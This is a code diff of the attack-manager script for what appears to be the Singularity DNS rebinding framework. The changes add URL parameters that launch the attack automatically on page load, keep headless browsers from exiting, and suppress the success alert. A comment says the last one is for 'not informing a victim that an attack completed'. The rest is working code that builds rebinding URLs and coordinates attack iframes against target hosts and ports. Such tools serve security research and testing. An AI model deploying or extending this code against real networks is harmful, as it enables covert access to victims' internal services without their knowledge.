@@ -1,17 +1,37 @@
 /* Attack Management */
 
+// Global state
 let count = 0;
 let errorCount = 0;
 let timerAttackFrameOne;
 let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";
 
+// Configuration
+let runningConfig = {};
+// Set URL parameter `startattack` to some value 
+// to automatically start attack upon loading manager.html page
+runningConfig.automatic = getParameterByName("startattack");
+// Set URL parameter `delaydomload` to some value 
+// to delay the browser DOM load event
+// and prevent premature exit of headless browsers
+runningConfig.delayDOMLoad = getParameterByName("delaydomload");
+// Set URL parameter `alertsucess` to "false"
+// to not present an alert box upon a successful rebinding attack.
+// This may be useful for:
+// * not informing a victim that an attack completed
+// * or to freeze a headless browser forever (unless performing a DoS attack).
+runningConfig.alertSuccess = getParameterByName("alertsuccess");
+
+// communication handler between manager and attack iframe.
 window.addEventListener("message", function (msg) {
-    console.log("Message received from", msg.origin, msg.data.status);
+    console.log("Message received from: ", msg.origin, msg.data.status);
+
+    if (msg.origin !== document.getElementById("attackframeone").src.substr(0, msg.origin.length))
+        return;
 
     if (msg.data.status == "start") {
-        console.log("iframe reports that attack has started");
-        if (msg.origin == document.getElementById("attackframeone").src.substr(0, msg.origin.length))
-            clearInterval(timerAttackFrameOne);
+        console.log("Iframe reports that attack has started");
+        clearInterval(timerAttackFrameOne);     
         msg.source.postMessage({
             cmd: "interval",
             param: document.getElementById("interval").value
@@ -26,13 +46,17 @@ window.addEventListener("message", function (msg) {
         }, "*");
     }
     if (msg.data.status == "success") {
-        console.log("IFrame reports attack successful", msg.data.response);
+        console.log("Iframe reports attack successful", msg.data.response);
 
         msg.source.postMessage({
             cmd: "stop"
         }, "*");
 
-        alert("Attack Successful: " + document.domain + " " + msg.data.response);
+        delaydomloadframe.src = "about:blank";
+
+        if (runningConfig.alertSuccess !== "false") {
+            alert("Attack Successful: " + document.domain + " " + msg.data.response);
+        }
     }
 
     // Possibly a firewalled or closed port. Possibly a non-HTTP service.
@@ -44,6 +68,7 @@ window.addEventListener("message", function (msg) {
             attackframeone.contentWindow.postMessage({
                 cmd: "stop"
             }, "*");
+            delaydomloadframe.src = "about:blank";
             alert("Too many errors");
         }
     }
@@ -51,8 +76,10 @@ window.addEventListener("message", function (msg) {
 
 });
 
+// Set src of attackframe
+// thus loading the attack payload before rebinding
+// and accessing the target after rebinding.
 function reloadAttackFrameOne() {
-
     document.getElementById("attackframeone").src = hosturl
         .replace("%1", document.getElementById("attackhostipaddress").value)
         .replace("%2", document.getElementById("targethostipaddress").value)
@@ -64,6 +91,7 @@ function reloadAttackFrameOne() {
         "?rnd=" + Math.random();
 }
 
+// Checks payload exists.
 function checkPayload() {
     const payloadsElement = document.getElementById('payloads');
     for (let p of config.attackPayloads) {
@@ -74,6 +102,7 @@ function checkPayload() {
     return false;
 }
 
+// Commences attack
 function begin() {
     if (!checkPayload()) {
         alert("Please select an attack payload first.");
@@ -86,15 +115,16 @@ function begin() {
     reloadAttackFrameOne();
 }
 
+// Toggles display of advanced settings.
 function toggle() {
     if (advanced.className === "d-block") {
         advanced.className = "d-none"
     } else {
         advanced.className = "d-block"
     }
-
 }
 
+// Requests Singularity to instantiate a new HTTP server on specified port.
 function requestPort() {
     putData('/servers', {
             "Port": document.getElementById("targetport").value
@@ -108,6 +138,7 @@ function requestPort() {
         .catch(error => console.error(error))
 }
 
+// Requests Singularity to provide list of HTTP servers/ports.
 function getHTTPServersConfig() {
     let ports = [];
     return fetch('/servers')
@@ -154,11 +185,26 @@ function forceCacheEviction() {
     }
 }
 
+// Obtains URL query parameters value based on name
+// Uses https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values-in-javascript
+//as URLSearchParams API not supported by all browsers
+// Returns `null` if  URL parameter `name` is not present, other its value.
+function getParameterByName(name, url) {
+    if (!url) url = window.location.href;
+    name = name.replace(/[\[\]]/g, '\\$&');
+    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+        results = regex.exec(url);
+    if (!results) return null;
+    if (!results[2]) return '';
+    return decodeURIComponent(results[2].replace(/\+/g, ' '));
+}
+
 /* UI Stuff */
 
+// Obtain payloads and target specs from manager-config.json
 function getPayloads() {
     payloadsElement = document.getElementById('payloads');
-    fetch('/manager-config.json')
+    let result = fetch('/manager-config.json')
         .then(function (r) {
             return r.text()
         })
@@ -171,7 +217,7 @@ function getPayloads() {
                 if (p.ports != "") {
                     port = ' (default port ' + p.ports + ')';
                 }
-                option.text  = p.name + port;
+                option.text = p.name + port;
                 payloadsElement.add(option, 0);
             }
             document.getElementById('attackhostdomain').value = config.attackHostDomain;
@@ -181,14 +227,28 @@ function getPayloads() {
             document.getElementById('indextoken').value = config.indexToken;
             document.getElementById('interval').value = config.interval;
         })
+    return result;
 }
 
+
+// Initialization after manager content is loaded.
 document.addEventListener("DOMContentLoaded", function (event) {
-    getHTTPServersConfig().then(function (HTTPServersConfig) {
+    let HTTPServersConfig = getHTTPServersConfig().then(function (HTTPServersConfig) {
         document.getElementById("listenports").textContent = HTTPServersConfig.ports;
         document.getElementById("targetport").value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
         document.getElementById("requestport").disabled = !HTTPServersConfig.AllowDynamicHTTPServers;
-    })
+    });
 
-    getPayloads();
+    let payloadsAndTargets = getPayloads();
+
+    // Once we have our HTTP servers config, payloads and targets
+    Promise.all([HTTPServersConfig, payloadsAndTargets]).then(function (values) {
+        //start attack on page load if ?startattack is set      
+        if (runningConfig.automatic !== null) {
+            if (runningConfig.delayDOMLoad === null) {
+                delaydomloadframe.src = "about:blank";
+            }
+            begin();
+        }
+    });
 });
